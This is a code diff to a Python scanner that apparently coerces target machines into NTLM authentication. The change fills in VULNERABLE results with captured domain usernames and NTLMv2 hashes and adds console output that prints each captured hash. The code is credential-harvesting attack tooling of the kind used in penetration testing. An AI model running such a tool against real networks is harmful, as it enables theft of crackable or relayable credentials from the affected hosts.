@@ -492,8 +492,9 @@ class Scanner:
 
         This method:
         1. Sleeps ``callback_timeout`` seconds so handshakes can finish.
-        2. Sweeps VULNERABLE results with empty ``auth_user`` → enriches
-           them with NTLM credentials from the completed handshake.
+        2. Sweeps VULNERABLE results missing ``auth_user`` or
+           ``ntlmv2_hash`` and enriches them from the completed
+           handshake data.
 
         Note: we intentionally do NOT upgrade ACCESSIBLE/UNKNOWN_ERROR
         results to VULNERABLE here.  Timestamp-based correlation cannot
@@ -504,10 +505,12 @@ class Scanner:
             return
 
         needs_drain = any(
-            r.result == TriggerResult.VULNERABLE and not r.auth_user
+            r.result == TriggerResult.VULNERABLE
+            and (not r.auth_user or not r.ntlmv2_hash)
             for r in self.stats.results
         )
         if not needs_drain:
+            log.debug("Drain: no VULNERABLE results needing enrichment")
             return
 
         log.debug(
@@ -524,16 +527,51 @@ class Scanner:
 
         listener = self._listener
         for result in self.stats.results:
-            if result.result == TriggerResult.VULNERABLE and not result.auth_user:
-                # Callback arrived but handshake wasn't done yet.
-                # Now the handshake may have completed; re-check.
-                cb = listener.get_callback_since(result.target, scan_start)
-                if cb is not None and cb.username:
-                    result.auth_user = (
-                        f"{cb.domain}\\{cb.username}" if cb.domain else cb.username
-                    )
-                    if cb.ntlmv2_hash and not result.ntlmv2_hash:
-                        result.ntlmv2_hash = cb.ntlmv2_hash
+            if result.result != TriggerResult.VULNERABLE:
+                continue
+            if result.auth_user and result.ntlmv2_hash:
+                continue  # Already fully enriched
+
+            # Callback arrived but handshake wasn't done yet.
+            # Now the handshake may have completed; re-check.
+            cb = listener.get_callback_since(result.target, scan_start)
+            if cb is None:
+                log.debug(
+                    "Drain: no callback data for %s %s::%s",
+                    result.target,
+                    result.protocol,
+                    result.method,
+                )
+                continue
+
+            enriched = False
+            if not result.auth_user and cb.username:
+                result.auth_user = (
+                    f"{cb.domain}\\{cb.username}" if cb.domain else cb.username
+                )
+                enriched = True
+            if not result.ntlmv2_hash and cb.ntlmv2_hash:
+                result.ntlmv2_hash = cb.ntlmv2_hash
+                enriched = True
+
+            if enriched:
+                log.debug(
+                    "Drain: enriched %s %s::%s — user=%s hash=%s",
+                    result.target,
+                    result.protocol,
+                    result.method,
+                    result.auth_user or "(none)",
+                    bool(result.ntlmv2_hash),
+                )
+                # Notify about newly available credentials
+                self._emit_drain_enrichment(result)
+            else:
+                log.debug(
+                    "Drain: callback for %s has no credentials (user=%s hash=%s)",
+                    result.target,
+                    bool(cb.username),
+                    bool(cb.ntlmv2_hash),
+                )
 
         if self._display:
             self._display.finish_drain()
@@ -835,6 +873,40 @@ class Scanner:
             self._display.add_result(result)
             return
         self._emit_line(result)
+
+    def _emit_drain_enrichment(self, result: ScanResult) -> None:
+        """Notify that a VULNERABLE result was enriched with credentials during drain."""
+        if self._display:
+            auth = f" [bold magenta]{result.auth_user}[/]" if result.auth_user else ""
+            tr = f" [dim]({result.transport})[/]" if result.transport else ""
+            self._display._console.print(
+                f"  [bold green][+] ENRICHED[/] {result.target} "
+                f"[blue]{result.protocol}[/]::{result.method}"
+                f"{tr}{auth}"
+            )
+            if (
+                result.ntlmv2_hash
+                and result.ntlmv2_hash not in self._display._printed_hashes
+            ):
+                self._display._printed_hashes.add(result.ntlmv2_hash)
+                self._display._console.print(
+                    f"    [bold yellow]Hash:[/] {result.ntlmv2_hash}",
+                    highlight=False,
+                )
+        else:
+            # Legacy output
+            auth = f" [bold magenta]{result.auth_user}[/]" if result.auth_user else ""
+            tr = f" [dim]({result.transport})[/]" if result.transport else ""
+            self.console.print(
+                f"[bold green][+][/] {result.target} | "
+                f"[blue]{result.protocol}[/]::{result.method}{tr}{auth} "
+                f"[dim](enriched during drain)[/]"
+            )
+            if result.ntlmv2_hash:
+                self.console.print(
+                    f"    [bold yellow]Hash:[/] {result.ntlmv2_hash}",
+                    highlight=False,
+                )
 
     def _emit_line(self, result: ScanResult) -> None:
         """Legacy per-line output (used when no live display is attached)."""
